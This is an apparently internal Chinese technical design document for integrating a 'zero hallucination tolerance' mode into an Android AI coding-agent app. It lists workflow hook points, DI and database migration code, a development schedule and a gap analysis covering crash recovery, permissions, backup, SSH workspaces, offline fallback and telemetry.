| 1 | `processUserTurn()` 第 1 行（buildContext 之前） | 新增 ZTH 预检 | `zthFacade.preflightCheck(sessionId)` → PERMANENT → 直接返回 WorkflowResult(FAILED, 建议开新会话) |
| 2 | `processUserTurn()` → 每次迭代主循环开头 | 新增能力检测 | `val caps = zthFacade.detectCapabilities(sessionState, userMsg, metadata)` → 对 VISION/COMPACTION 等构造降级请求 |
| 3 | `callLlm()` try-catch catch(e) 块（现有 240~290 行 VISION_UNSUPPORTED_HINTS 位置） | 替换硬编码错误匹配 | `val (cls, rule) = zthFacade.classifyFailureAndResolve(e, ctx)` → 按 rule.standardActions 执行 → 若 mustShowCard 调用 chainExecutor.showCardAndAwait |
| 4 | `callLlm()` 返回 RawLlmResponse 之后（下一迭代之前） | 新增幻觉检测链路 | `val assessment = zthFacade.hallucinationClassifier.assess(raw, ctx)` → mustShowCard → 阻塞出卡 + 熔断加分 |
| 5 | 所有 LLM 调用的 messages 组装（3 处：主模型 callLlm / runVisionFallback 识图模型 / ContextCompactor 压缩模型） | 统一走过滤器 | 替换原来的 messages.map → `zthFacade.messageBuilder.build(rawMessages, PURPOSE)`（MSG-INV-3/4 强制执行） |
| 6 | `buildSystemPrompt()` 末尾 return 之前 | 新增 sentinel plan rejection 前缀 | `return zthFacade.enrichWithPlanRejectionWarnings(basePrompt, sessionId)`（LINK-INV-1 ⚠️ 注入） |
| 7 | `compactIfNeeded()` 内部实现 | 保留对外函数签名，内部委托 | `return zthFacade.compactIfNeeded(messages, provider, sessionId, onEvent)` → L0→L1→L2 升级式 |

### 10.2 ContextCompactor 包装改造（保留对外 API）

```kotlin
// 保留现有签名（StatefulAgentWorkflow 调用点零改动）：
@Singleton
class ContextCompactor @Inject constructor(
    private val agentMessageDao: AgentMessageDao,
    private val modelMetadataService: ModelMetadataService,
    // ZTH 改造新增：注入 CompactionPipeline
    private val compactionPipeline: CompactionPipeline? = null,
    private val zthEnabled: Boolean = false  // Feature flag（BuildConfig 控制，逐步灰度）
) {
    suspend fun compactIfNeeded(
        messages: List<AgentMessage>,
        aiProvider: AIProvider,
        sessionId: String? = null,
        force: Boolean = false,
        onEvent: suspend (AgentEvent) -> Unit = {}
    ): List<AgentMessage> {
        // ZTH 开启 → 走新 CompactionPipeline
        if (zthEnabled && compactionPipeline != null && sessionId != null) {
            return compactionPipeline.compactIfNeeded(messages, aiProvider, sessionId, onEvent)
        }
        // ZTH 关闭 → 走原有实现（359 行，零改动）
        return legacyCompactIfNeeded(messages, aiProvider, force, onEvent)
    }

    // 原有 359 行实现改名挪到 private legacyCompactIfNeeded（零改动代码）
    private suspend fun legacyCompactIfNeeded(...): List<AgentMessage> { /* 原有全部代码 */ }
}
```

### 10.3 ProviderEditorScreen UI 替换（1 整块替换）

```
现有 RC63 区块（底部 CompatibilityPolicyDropdown + 2 Switch）
    ↓ 整块删除，替换为：
┌───────────────────────────────────────────────────────┐
│ ZTH Section 1：ZthPresetSelector                       │
│   STRICT / ⭐BALANCED / LAX / MANUAL 单选              │
├───────────────────────────────────────────────────────┤
│ ZTH Section 2：ZthCapabilityChainOverviewCard ×5 行    │
│   识图（Vision）/ 上下文压缩（Compaction）              │
│   工具调用（Tools）🛡️ / 思考（Reasoning）🛡️            │
│   流式输出（Streaming）                                 │
├───────────────────────────────────────────────────────┤
│ ZTH Section 3：ZthFuseDashboard 只读仪表盘             │
│   🟢/🟡/🔴 状态 + 分数 + CRITICAL 命中 + 重置按钮      │
└───────────────────────────────────────────────────────┘
```

**SettingsViewModel 需要额外暴露的 4 Flow + 4 Setter**：
```kotlin
// 新增 Flow
val zthActivePresetFlow: StateFlow<PresetId>
val zthChainSpecsPerProviderFlow: StateFlow<Map<String, CompatibilityChainSpecs>>
fun zthFuseDashboardFlow(sessionId: String): Flow<FuseDashboardData>
val zthParamsSnapshotFlow: StateFlow<ZthParamsSnapshot>

// 新增 Setter
suspend fun selectZthPreset(preset: PresetId, applyToAllProviders: Boolean)
suspend fun saveResolverEdit(providerId: String, capability: String, newSpec: ChainSpec)
suspend fun saveZthParamsEdit(newSnapshot: ZthParamsSnapshot)
suspend fun resetCurrentSessionFuseScore(sessionId: String)
```

### 10.4 AgentModule DI 参数扩展（2 种方案）

**方案 A（推荐，参数少）：注入 ZthFacade 门面 + 原有 compatibilityPolicyRepository**
```kotlin
// provideAgentWorkflow 函数签名：
@Provides @Singleton
fun provideAgentWorkflow(
    // ... 原有 18 参数（去掉 contextCompactor 改由 ZTH 内部注入？不，保留原有注入供 legacyCompactIfNeeded 用）...
    compatibilityPolicyRepository: CompatibilityPolicyRepository,
    zthFacade: ZthFacade  // ← 新增 1 个，代替所有子系统
): AgentWorkflow {
    return StatefulAgentWorkflow(
        // ... 其他 18 个 ...
        compatibilityPolicyRepository,
        zthFacade  // ← 传
    )
}

// StatefulAgentWorkflow 构造函数末尾新增 1 个参数：
// private val zthFacade: ZthFacade
```

**方案 B（显式，调试方便）：注入所有子系统（7 个新参数）**
```kotlin
fun provideAgentWorkflow(
    // ... 原有 18 个 ...
    compatibilityPolicyRepository: CompatibilityPolicyRepository,
    // ZTH 7 子系统
    capabilityDetector: CapabilityDetector,
    chainExecutor: DegradationChainExecutor,
    compactionPipeline: CompactionPipeline,
    circuitBreaker: HallucinationCircuitBreaker,
    fuseCoordinator: FuseOpenGlobalCoordinator,
    revertCoordinator: CheckpointRevertCoordinator,
    messageBuilder: ZthLlmMessageBuilder
): AgentWorkflow
```

### 10.5 数据库 AgentDatabase.kt 升级

```kotlin
@Database(
    entities = [
        // ---- v33 原有 12 张 ----
        AgentMessageEntity::class, ChatSessionEntity::class,
        AIProviderEntity::class, RemoteConnectionEntity::class, RemoteMountEntity::class,
        TodoItemEntity::class, GitCredentialEntity::class,
        CheckpointEntity::class, CheckpointFileSnapshotEntity::class,
        CredentialEncryptionStateEntity::class, RemoteAuditLogEntity::class,
        ModelCapabilityOverrideEntity::class,

        // ---- ZTH v34 新增 2 张 ----
        UserConfirmedSentinelEntity::class,
        SentinelPlanRejectionAudit::class,

        // ---- ZTH v35 新增 3 张 ----
        HardConstraintDeleteAudit::class,
        L0SoftCompactRestoreLogEntity::class,
        HallucinationFuseEntity::class
    ],
    version = 37,   // v33 → 34 → 35 → 36（空步）→ 37
    exportSchema = true
)
abstract class AgentDatabase : RoomDatabase() {
    // ---- 原有 11 个 DAO ----
    abstract fun agentMessageDao(): AgentMessageDao
    abstract fun chatSessionDao(): ChatSessionDao
    abstract fun modelCapabilityOverrideDao(): ModelCapabilityOverrideDao
    // ... 其他原有 ...

    // ---- ZTH 新增 5 个 DAO ----
    abstract fun userConfirmedSentinelDao(): UserConfirmedSentinelDao
    abstract fun sentinelPlanRejectionAuditDao(): SentinelPlanRejectionAuditDao
    abstract fun hardConstraintDeleteAuditDao(): HardConstraintDeleteAuditDao
    abstract fun l0SoftCompactRestoreLogDao(): L0SoftCompactRestoreLogDao
    abstract fun hallucinationFuseDao(): HallucinationFuseDao

    companion object { const val SCHEMA_VERSION = 37 }
}
```

**新增 assets/migrations/ 4 份 SQL 脚本**（对应第 3.4 章完整 SQL）：
```
33_zth_v34_sentinel_plan_audit.sql
34_zth_v35_3audit_fuse.sql
35_zth_v36_empty_step.sql
36_zth_v37_upgrade_3tables_13cols.sql
```

---

## 附录 A：本文档与 ZTH v1.0 文档对应关系

| 本文档章节 | 对应 ZTH_MODE_TECHNICAL_DESIGN_v1_0.md 章节 | 备注 |
|---|---|---|
| §0 项目全景 | §0 顶层铁律 & §1 全景依赖图 | 补充现有实际包结构 + 技术栈 |
| §1 Agent 工作流 | §2.1~§2.2 第一层路由管线 & §9 钩子落点 | 精确到 StatefulAgentWorkflow 构造函数签名 + 7 改造点 |
| §2 设置模块 | §2.3 chainSpec 存储 & §8.1 UI 三段式 | 补充 SettingsViewModel 1140 行实际 Flow 清单 |
| §3 数据库层 | §5 DB Schema v33→v37 & 5.1~5.3 SQL | 补充 v33 原有 12 表详解 + MigrationLoader 机制 |
| §4 Hilt DI | §1.4 di/ZthModule.kt | 补充 AgentModule 412 行实际 @Provides 清单 + 双阶段 DB 兜底 |
| §5 工具系统 | §2.1 FailureClassifier TOOL 子类 | 补充 ToolRegistry 15 工具实际注册清单 + 权限流程 |
| §6 压缩检查点 | §3 第二层多级保真 & §3.6 L0 还原 | 补充 ContextCompactor 359 行实际流程 + CheckpointManager 147 行 |
| §7 ZTH 模块设计 | §1.1 包结构 & §2/§3/§4 三层 & §7 子系统 | 所有类补全精确 Kotlin 签名（构造函数注入参数 + 返回值） |
| §8 关联数据流 | §1.2 核心类依赖图 & §1.3 数据流向 6 路径 | 补充 ASCII 时序图 + UI→VM→Domain→Data 垂直调用链 |
| §9 函数签名总表 | §6.2 Proto 30 参数 & §7 参数总表 | 补充 9.2.2 17×12 状态机完整枚举 + DegradationChainResult |
| §10 钩子落点 | §9 与现有代码钩子落点清单 | 补充 §10.2 ContextCompactor 包装改造（保留旧 API 灰度方案） |

## 附录 B：开发顺序推荐（2 周迭代计划）

| 周 | 阶段 | 交付物 | 单测覆盖 |
|---|---|---|---|
| W1D1~D2 | 基础设施层 | DI Module（ZthModule）+ DB Migration v33→v37 + 5 Entity/DAO + 4 SQL 脚本 | Migration 回滚测试；DAO CRUD 测试；MSG-INV-1 sentinel UPDATE 失败断言 |
| W1D3~D4 | 第一层路由骨架 | CapabilityDetector + FailureClassifier（证据表）+ ZthDecisionMatrix 16 行常量 + ResolverResolver | 决策矩阵 16×2=35 行全覆盖（§10.3）；CSPEC-INV 1~3 校验；UID 复用逻辑 |
| W1D5 | CardVM + 阻塞机制 | ZthConfirmationCardViewModel（骨架状态机 E1~E3, E15~E17）+ suspendAwaitUserConfirm() 挂起 | CARD-INV 1~4 不变性；Cancel 只能 4 合法路径；阻塞超时不泄露 |
| W2D1~D2 | 第二层压缩骨架 | L0SoftCompactor（4 断言）+ CompactionPipeline 单向状态机 + Checkpoint 自动保存（type=L0_PRE/L1_PRE/L2_PRE） | L0 断言 4 条全场景；aborted→升级 L1 正确；压缩前后 hash 一致（MSG-INV-2） |
| W2D3 | 第三层四方联动 | HallucinationCircuitBreaker（6 态）+ LINK-INV 0/2/4（@Transaction 4 写）+ FuseOpenGlobalCoordinator（横幅） | LINK-INV-0 max() 回滚测试；6 FuseState 跃迁；CB OPEN→横幅自动拒 Plan |
| W2D4 | UI 集成 | ZthPresetSelector + ZthCapabilityChainOverviewCard + 3 Card 模板 + FuseDashboard | 预设切换→Per-Provider specs 写回；卡片密度渲染正确；横幅无关闭按钮 |
| W2D5 | 端到端集成 + 回归 | StatefulAgentWorkflow 7 钩子点接入；老 ContextCompactor legacy 灰度开关 | 15 ZTH 不变性全绿（§10.1）；step-3.7-flash 识图路径回归；非 step 纯文本模型不受影响 |

---

## 附录 C：遗漏模块与边界话题清单（v1.0 文档盲区）

> **风险等级说明**：🔴 阻断级（不讨论清楚无法编码）🟡 重要级（影响体验/正确性/可维护性）🟢 次要级（可迭代补全）

### C.1 现有代码库中的未覆盖模块（§0~§6 遗漏）

以下模块在 v1.0 文档中 **几乎未提及**，但实际是 Agent 工作流的强依赖，ZTH 钩子落点（§10）也需要它们的接口才能正确集成。

| 编号 | 模块名 | 真实代码规模 | 风险 | 与 ZTH / 现有文档的关联缺口 |
|---|---|---|---|---|
| C.1.1 | **容器引擎层**：LinuxContainerEngine（1208 行）+ DelegatingCommandEngine + RemoteSshEngine + ContainerInstaller + ContainerProfile（内置 Alpine / 自定义） | 2000+ 行 | 🔴 阻断 | ZthToolOutputGuard（§4.2 Tool FailureClass）审查 `executeCommand` 输出，但其执行位置取决于 ExecutionModeHolder 的 LOCAL vs REMOTE_SSH；容器初始化失败（ContainerInitState.Failed）会导致所有工具返回失败，ZTH 需要正确归类为 E11_INFRA 而非 E5_TOOL |
| C.1.2 | **终端 Bundle 管理**：TerminalBundleRepository（196 行）+ 7 个 TerminalBundleId（CORE/PYTHON/NODE/GIT/CURL/RIPGREP/GIT_CRED）状态机 + RealProgressAggregator 并行下载槽 + ProgressModels（InstallPhase/DownloadSlot/LogLine） | 600+ 行 | 🟡 重要 | AI 首次推荐安装 Bundle 时，工具 execute_command("apk add python3") 触发 TerminalBundleRepository.emitInstalling()，该进度需同步给 ZthConfirmationCard（若用户点了“查看工具执行详情”）；若 Bundle 安装失败，FailureClassifier 要区分「网络中断」E11 vs 「镜像源不可用」E11 |
| C.1.3 | **MCP 系统**：McpManager + McpClient + McpTransport（Stdio/Http 两种）+ McpConfigRepository + McpServerConfig + ManageMcpTool | 800+ 行 | 🔴 阻断 | ① MCP 暴露的第三方工具（非 ToolRegistry 内置 15 个）进入 ZthCapabilityGuard（§4.1）时，capability 从何而来？McpToolDescriptor 没有 ToolCapability 枚举字段；② ManageMcpTool.add_stdio 需要容器 engine ready，否则抛异常，FailureClassifier 需归 E11；③ MCP 工具调用的超大 ToolResult 输出（例如 MCP 返回 2MB 代码）是否走 ToolOutputStore 的 chunk 机制？ZthToolOutputGuard 审查 chunk 还是聚合结果？ |
| C.1.4 | **Skill 系统**：SkillRepository（Composite）+ LocalDirectorySkillSource + SkillParser（YAML frontmatter）+ Skill + LoadSkillTool | 200+ 行 | 🟡 重要 | ① AI 调用 `loadSkill` 后，拿到的 SKILL.md 正文（可能含「先 apk add XXX」）是否要走 ZthContentReviewer？（skill 正文含恶意指令时属于 E8_MODEL_GEN，而非 E4/5）；② Skill.requiredTools 与 ZthCapabilityGuard 的 capability 映射关系？（skill 声明 `required_tools: ["Bash(git)"]` 是否视为该 skill 自带权限声明，ZTH 审查时是否放行？）；③ Skill 指令正文存放在容器文件系统，BackupManager 备份时不含 skills 目录，还原后 skill 丢失 |
| C.1.5 | **权限系统**：PermissionRulesRepository（PROJECT/GLOBAL 双 Scope 分层）+ ToolPermissionManager（挂起等待 CompletableDeferred）+ PermissionModels（PermissionRule/PermissionChoice/PermissionFile）+ PendingToolPermission | 400+ 行 | 🔴 阻断 | **ZTH 与权限系统的冲突点**：ZthConfirmationCard（用户确认）与 ToolPermissionManager.awaitApproval（弹窗）是两个独立的挂起点——① 同一个工具调用会串行挂起两次吗？（先 ZTH Card 确认 plan → 再权限弹窗确认执行 → 再工具执行）；② 用户在权限弹窗选了 ALWAYS，生成 PermissionRule(pattern="git push") 后，下次 ZthCapabilityGuard 审查是否可以跳过单条 Confirmation？（节省 LLM 调用 + 用户点击）；③ PermissionScope.GLOBAL 的 DENY 优先级跨 scope 最高，ZTH 审查时如果权限系统已经 DENY，ZTH 要不要再弹 Card？还是直接走 E6_PERMISSION 路径？ |
| C.1.6 | **备份系统**：BackupManager（685 行，流式 tar.gz + AES-GCM 加密）+ BackupSnapshot + BackupMetadata + BackupViewModel + BackupSection | 1200+ 行 | 🟡 重要 | ① BackupOptions 无 ZTH 字段，BackupSnapshot 不导出 5 张 ZTH 表（user_confirmed_sentinel / zth_hallucination_fuse 等），用户备份→换机还原后：sentinel 丢失 → LINK-INV-0 断言失败 → CHECKPOINT 无法还原 → CRASH-RECOVER 逻辑（下文 C.2.1）全部走 FAIL_FAST；② 加密备份的 AES-GCM key 是否也加密 ZTH 表中的 sentinel 明文？sentinel 可能含用户代码片段，DB 明文存储是否合规？；③ BackupManagerImpl.safeDao() 包装了所有 DAO 访问（防 Room 首次 query 崩），ZTH 的 5 个 DAO 必须也走 safeDao，否则备份时触发 schema 校验崩进程 |
| C.1.7 | **工作区系统**：WorkspaceRepository（LOCAL/REMOTE_SSH 双模式）+ Workspace model + WorkspacePicker UI + WorkspacePathMapper | 700+ 行 | 🔴 阻断 | ① CheckpointManager.beforeFileModified() 只支持 java.io.File（本地模式），远程 SSH 模式下文件在远端服务器，需要 RemoteFileAccessProvider.readFile() 做快照，当前实现无；② ZthL0SoftCompactor（§3.2）扫描工作区「最近修改 10 个文件」，本地用 File.lastModified()，远端要用 SFTP stat，两者接口不同；③ 用户切换工作区时（WorkspaceRepository.selectWorkspace()），AgentSessionState 中正在进行的 sentinel 确认、压缩日志、CB 半开计数，属于旧工作区还是要带到新工作区？（session 级 vs workspace 级状态的归属问题） |
| C.1.8 | **工具输出存储**：ToolOutputStore（184 行，超大输出 chunk 化+内部分片+File 持久化+返回元数据 Token） | 184 行 | 🟡 重要 | ① ToolOutputStore.process() 把超大输出拆成 chunk 写入 filesDir，ZthToolOutputGuard 审查的是 chunk 还没聚合完成的部分？还是聚合后一次性审查？；② 工具返回 ToolResult.Partial（流式）时，ZthToolOutputGuard 可以在 chunk 之间「增量审查」发现幻觉提前中断，而非等全部执行完毕；③ ToolOutputStore 写的临时文件，CheckpointManager 要不要快照？（工具输出不是 workspace 文件，CP 不会管，但 ZTH L0 压缩可能引用它们） |
| C.1.9 | **容器设置**：ContainerSettingsRepository（activeProfileIdFlow）+ ContainerProfile（BUILTIN_ALPINE vs 自定义 Debian/Ubuntu rootfs）+ 工作区路径映射 | 300+ 行 | 🟢 次要 | 用户切到自定义 rootfs 后 apk 命令不存在（不是 Alpine），TerminalBundleRepository 的 apk add 全失败，ZthFailureClassifier 需识别「包管理器不兼容」归 E11，而非 E5_TOOL |

---

### C.2 ZTH 设计本身遗漏的边界话题（§7~§10 盲区）

以下话题在 ZTH 零幻觉容忍设计文档（ZTH_MODE_TECHNICAL_DESIGN_v1_0.md）中 **完全未讨论**，但实现时会遇到且直接影响铁律（ZTH-0~ZTH-3）合规。

| 编号 | 话题 | 风险 | 详细说明 & 必须做出的决策 |
|---|---|---|---|
| **C.2.1** | **崩溃恢复（App 被 OOM 杀 / 设备重启）** | 🔴 阻断 | **现状缺口**：ZTH 多处挂起事务——sentinel 等用户确认（最长 30 分钟超时）、L0→L1→L2 升级过程中的压缩元数据、四方联动的 4 写中间态。如果 Android 因内存压力杀进程，下次冷启动时状态不连续。<br/>**必须决策的 3 件事**：<br/>① **Sentinel 重启恢复策略**：APP_START→检查 agent_session 中 `has_pending_sentinel=true` 的 session→查 DB 的 user_confirmed_sentinel 表→若该 sentinel 存在且未过期（< 24h）→自动重新弹出 ConfirmationCard（INIT→LOADING→LOADED），沿用原 sentinel_id；若过期→写 HardConstraintDeleteAudit（reason=CRASH_SENTINEL_EXPIRED）+ sentinel 行删除 + LINK-INV-0 用 fallback 计算（取 message_count 与 checkpoint_count 的较小值）。<br/>② **四方联动中间态崩溃恢复**：LINK-INV-0/2/4 用 `@Transaction` 保证原子，但 Android Room 的 Transaction 在写入过程中崩 = 全回滚，不会有脏数据；需要额外做：冷启动后扫 `zth_hallucination_fuse.last_transition_reason == LINK_INV_0_IN_PROGRESS` 这一临时态（设计时需增加 FuseState = TRANSITIONING），若存在则重新执行 LINK-INV-0 完整 4 写。<br/>③ **降级链挂起中崩**：DegradationChainResult 已确认 HALF + pending_cps = [L1]，用户还没点「批准执行 L1」时崩了，重启后：从 L0SoftCompactRestoreLog 找到最近一条 aborted 的 L0，继续 L1 审批流程，或直接走 ZTH-3 FAIL_FAST 提示用户「上次上下文压缩未完成，建议重新生成回复」。 |
| **C.2.2** | **性能与资源开销（低端机可运行性）** | 🟡 重要 | **现状缺口**：ZTH 每轮用户消息，在原 1 次 LLM 调用（回答）基础上增加：① ZthCapabilityGuard 审查（小 prompt，~300 tokens）② ZthFailureClassifier 证据收集 + 分类（~500 tokens）③ L0 压缩（~200 tokens，可选）④ PlanApproval 审批模型（~800 tokens）——合计 1.8~2.8 倍 LLM token 开销。<br/>**必须决策的 4 件事**：<br/>① **低端机阈值**：定义「低端机」= RAM ≤ 4GB 或 Android API ≤ 28。低端机默认开 ZTH 档位 1（BALANCED）还是档位 0（DISABLE）？能不能强制用户至少开 PERMISSIVE？<br/>② **审查批处理**：CapabilityGuard 一次审查 20 条 tool_candidate 合成 1 次 LLM 调用，不拆 20 次；这个 batch_size 默认 20 还是可调？<br/>③ **本地快速跳过**：CapabilityDetector 先做本地启发式（和 step- 白名单类似），90% 情况本地判定无幻觉风险 → 跳过 LLM 审查，只留 10% 高风险走 LLM。启发式规则：`writeFile/delete` 目标在 .gitignore 内 = 低风险；`readFile(grep/ls)` 只读 = 零风险；`executeCommand(echo/cat)` 白名单命令 = 零风险；其他高风险。<br/>④ **超时降级**：CapabilityGuard 的 LLM 调用超过 8s 未返回 → 抛超时 → FailureClassifier 归 E11_INFRA（超时属于 Provider 故障）→ 走 INFRA 降级链（重试 1 次 + 仍失败则自动跳过审查 + 标记「本次回复未经 ZTH 审查」横幅）。 |
| **C.2.3** | **安全与隐私** | 🟡 重要 | ① **Sentinel 明文存 DB 是否合规**：sentinel_content 含用户代码片段/API key 片段，Room DB 文件在 app 私有目录（无 root 无法访问），但若用户开启了 Android 「备份我的数据」（adb backup），sentinel 会被备份到 Google 云端 → 需要在 AndroidManifest.xml 的 `<application>` 加 `allowBackup=false` 或把 sentinel 字段加密存。<br/>② **Confirmation 弹窗防误触**：ZTH Card 的「确认」按钮必须点击位置验证（不能通过 Accessibility Service 自动点击），且点击前做 500ms 防抖防止连点；「拒绝」和「确认」位置必须固定（确认永远在右），避免位置钓鱼。<br/>③ **备份加密的 ZTH 字段**：AES-GCM 加密的备份文件中，ZTH 5 张表的字段必须按 GLOBAL/GLOBAL+PROJECT 分类加密，不能明文混在 tar 里。<br/>④ **日志脱敏**：FileLogger 打印 sentinel_id、plan_id 时只打印前 8 位（类似 token 脱敏），完整 id 只在 DB 内联。 |
| **C.2.4** | **灰度开关与一键回滚** | 🟡 重要 | **现状缺口**：v1.0 设计只有「全局 4 档预设」，没有版本灰度。ZTH 功能庞大，首次上线出 bug 时必须能立即关闭。<br/>**必须决策**：<br/>① **双重 kill-switch**：<br/>&nbsp;&nbsp;- Level 1：`FeatureFlagRepository`（需新建，存 DataStore boolean）`zthModeEnabled` 默认 **false**，首次升级 v1.0 后由用户手动在设置页「开启 ZTH 零幻觉模式」，**不默认开启**。<br/>&nbsp;&nbsp;- Level 2：远程配置开关（若后续接 Firebase Remote Config 或自建）覆盖本地；远程下发 zth_mode_force_disable=true → Level 1 即使开了也被全局禁用，所有 ZTH 钩子走 legacy 路径。<br/>② **ZTH→Legacy 单向回滚保证**：关闭 zthModeEnabled 后，所有 ZTH 新增列继续保留（不删），StatefulAgentWorkflow 全部走 legacy 分支；再次开启时 DB 中已有 sentinel 继续有效，不会丢历史。**禁止反向迁移（v37→v33）**，只允许单向升级。<br/>③ **已存在 sentinel 的回滚策略**：用户中途关闭 ZTH，sentinel 处于 AWAITING_CONFIRM 状态 → 下次开启时自动重弹 Card；若用户关闭 ZTH 超过 7 天 → sentinel 过期作废（CRON 清理 job，需新建 WorkManager 定期任务）。 |
| **C.2.5** | **多会话并发 & 状态隔离** | 🔴 阻断 | **现状缺口**：v1.0 设计的 Fuse 有 session 级和 global 级，但没说「多会话并发时 global 级如何正确」。<br/>**必须决策**：<br/>① **session 级 Fuse 完全隔离**：每个 ChatSession 独立持有 CircuitBreaker 状态机实例（由 StatefulAgentWorkflow 按 sessionId 存 Map<String, HallucinationCircuitBreaker>）；用户同时开 2 个聊天，session A 的 fuse 爆了（CONSECUTIVE_HALLUC=3）只影响 A，session B 正常。<br/>② **global 级 Fuse 是原子引用**：`zth_hallucination_fuse.scope=GLOBAL` 的行只有 1 条，读写用 SQL `UPDATE ... SET version = version + 1 WHERE id = ? AND version = ?`（乐观锁）；若 2 个会话同时触发 LINK-INV-0，只有一个胜出，另一个重试 1 次再失败就跳过 global 写（因为 session 级已经正确写了，global 只是汇总兜底）。<br/>③ **HALF_OPEN 冷却归属**：§4.4.1 中 fuse_state=HALF_OPEN 的 cooldown_sec=180 是 **按 session 级**计时的（每个 session 各自独立 3 分钟，不会因为另一个会话也在爆冷却更长）；GLOBAL 级 HALF_OPEN 冷却 300 秒，UI 横幅显示「全局冷却剩余 XX 秒」。 |
| **C.2.6** | **离线 / 断网场景** | 🟡 重要 | **现状缺口**：ZthCapabilityGuard 和 ZthFailureClassifier 都需要调 LLM 审查。没网时 Provider 连不上，这两个步骤必挂。<br/>**必须决策**：<br/>① **审查降级 3 档**：<br/>&nbsp;&nbsp;- 无网状态下，ZthCapabilityGuard 自动走「启发式只放行安全项」= 只读工具（readFile/grep/ls）+ 白名单命令（echo/cat/git status）→ 放行；其余高风险（writeFile/executeCommand/delete）→ 直接弹 ConfirmationCard（不需要 LLM 审查，直接用户手动批）。<br/>&nbsp;&nbsp;- ZthFailureClassifier 离线时 → 所有 failure 默认归 E11_INFRA（Provider 不可用）→ 走 INFRA 降级链（重试 + 失败则提示用户联网重试）。<br/>&nbsp;&nbsp;- PlanApproval 离线时 → 跳过模型审批，直接让用户手动确认 Plan（跳过模型判断步骤，但用户确认依然不能省，符合 ZTH-0）。<br/>② **离线横幅提示**：检测到 NetworkCapabilities.NET_CAPABILITY_INTERNET 丢失时，在 ZthCapabilityChainOverviewCard 顶部显示「当前离线，ZTH 审查降级为手动模式」，但 **ZTH 横幅不能出现关闭按钮**（和 Fuse OPEN 横幅同约束）。 |
| **C.2.7** | **备份 / 还原 ZTH 表的一致性策略** | 🟡 重要 | 关联 C.1.6 备份系统：BackupSnapshot 需要加 5 个 ZTH 字段：<br/>```kotlin<br/>data class BackupSnapshot(  // 原有字段不变，追加以下<br/>  val zthUserConfirmedSentinels: List<UserConfirmedSentinelDto> = emptyList(),<br/>  val zthHallucinationFuses: List<HallucinationFuseDto> = emptyList(),<br/>  val zthSentinelPlanRejections: List<SentinelPlanRejectionAuditDto> = emptyList(),<br/>  val zthHardConstraintDeletes: List<HardConstraintDeleteAuditDto> = emptyList(),<br/>  val zthL0SoftCompactRestoreLogs: List<L0SoftCompactRestoreLogDto> = emptyList(),<br/>)<br/>```<br/>**必须决策**：<br/>① **还原幂等策略**：导入备份时，如果本地 DB 已存在同 id 的 sentinel → 以 **本地为准跳过**（不覆盖用户已确认的）；fuse 行如果本地有 GLOBAL → 以本地为准（用户可能把 global 关了，导入旧值打开会违反 ZTH-0）。<br/>② **schema 跨版本还原**：备份是 v37 schema 导入到新 App（假设 v38 已升级）→ 新字段取默认值（和 BackupSnapshot 已有逻辑一致）；备份是 v38 导入回旧版 v37 App → **拒绝还原**（BackupManager 现有逻辑），ZTH 表不会被截半。 |
| **C.2.8** | **远程 SSH 模式下的 ZTH 适配** | 🔴 阻断 | 关联 C.1.7 Workspace 系统：当 ExecutionMode = REMOTE_SSH 时，工作区是远程服务器文件夹，文件工具走 SFTP，execute_command 走 SSH 连接。<br/>**必须决策的 4 件事**：<br/>① **Checkpoint 文件快照**：CheckpointManager.beforeFileModified() 需要抽象出 FileSnapshotProvider 接口，两个实现：LocalFileSnapshotProvider（java.io.File）+ RemoteSshFileSnapshotProvider（SFTP download 临时文件）；ZTH 钩子无差别调用。<br/>② **L0 软压缩的工作区扫描**：L0SoftCompactor 的「最近修改 10 个文件」= 远程模式下走 `ssh find /workspace -type f -printf '%T@ %p\n' | sort -nr | head -10`；不能本地 File.walk()。<br/>③ **工具路径映射**：WorkspacePathMapper 负责把 workspace path（/root/project/foo.py）↔ 容器内路径（~/workspace/foo.py），远程模式下直接用绝对远程路径，ZthLlmMessageBuilder 过滤 SYSTEM_METADATA 时也要同步调整路径前缀。<br/>④ **AI 连不上 SSH 时的归类**：FailureClassifier 把 JSchException / SftpException 统一归 E11_INFRA（REMOTE_SSH_DOWN），不是 E5_TOOL；对应错误消息中英文显示「远程服务器连接失败，请检查 SSH 配置」。 |
| **C.2.9** | **国际化 (i18n) & 可访问性 (A11y)** | 🟢 次要 | ① **i18n**：v1.0 设计中 ConfirmationCard 的所有文案（「我可能产生幻觉，请你确认」「我计划执行以下操作」「拒绝」「仅本次」「始终允许」「压缩上下文」等）必须进 `strings.xml`，提供 zh-rCN / en 两种；ZTH 预设包的描述字符串必须是 `@StringRes` 不能硬编码。<br/>② **A11y**：<br/>&nbsp;&nbsp;- ConfirmationCard 的「确认/拒绝/查看详情」3 个按钮必须 ≥ 48dp（Material Design 最小点击区域），contentDescription 必须声明为 `@StringRes`。<br/>&nbsp;&nbsp;- Fuse OPEN 横幅的红色有语义（紧急），不能只靠颜色，必须加 ⚠ 图标 + TalkBack 读「警告：已触发零幻觉保护，当前会话暂停生成，请检查」。<br/>&nbsp;&nbsp;- 密集信息（如 ChainOverviewCard 的 3 层压缩进度条）不能只靠视觉，必须用 Semantics 声明「第 1 层 L0 软压缩，进度 70%，已执行 2 秒」。<br/>&nbsp;&nbsp;- 字体缩放：所有文案支持 200% 系统字体放大不溢出（ConfirmationCard 的 3 行概要 + 5 行 plan 明细需要可滚动，不能被截断）。 |
| **C.2.10** | **埋点与遥测（后续校准 ZTH 参数）** | 🟢 次要 | v1.0 设计中所有阈值（30 分钟 sentinel 超时、6 秒 L0 阈值、HALF_OPEN 180 秒冷却、CONSECUTIVE_HALLUC=3 熔断）都是拍脑袋值，需要实际使用数据校准。建议预留埋点：<br/>① **事件埋点**（无需用户同意匿名化）：<br/>&nbsp;&nbsp;- `zth_card_show(cardType: ConfirmationType, preset_level: Int)` → 弹卡率<br/>&nbsp;&nbsp;- `zth_card_action(action: E15~E17, latency_ms: Long)` → 用户点「确认/拒绝/查看详情」的比例 & 思考时长<br/>&nbsp;&nbsp;- `zth_fuse_transition(from: FuseState, to: FuseState, reason: String)` → 熔断频率 & 恢复成功率<br/>&nbsp;&nbsp;- `zth_compact_triggered(level: L0/L1/L2, token_count_before, token_count_after, success: Boolean)` → 压缩率分布<br/>&nbsp;&nbsp;- `zth_failure_classified(failure_class: FailureClass, subclass: SubClass, resolved_by_user: Boolean)` → 16 SubClass 的实际分布<br/>② **导出匿名诊断**：设置页加「导出 ZTH 匿名诊断数据」按钮 → 生成 JSON（无 sentinel_content 明文，只有 id + 指标）→ 用户可自己分析或分享给开发者调参。 |
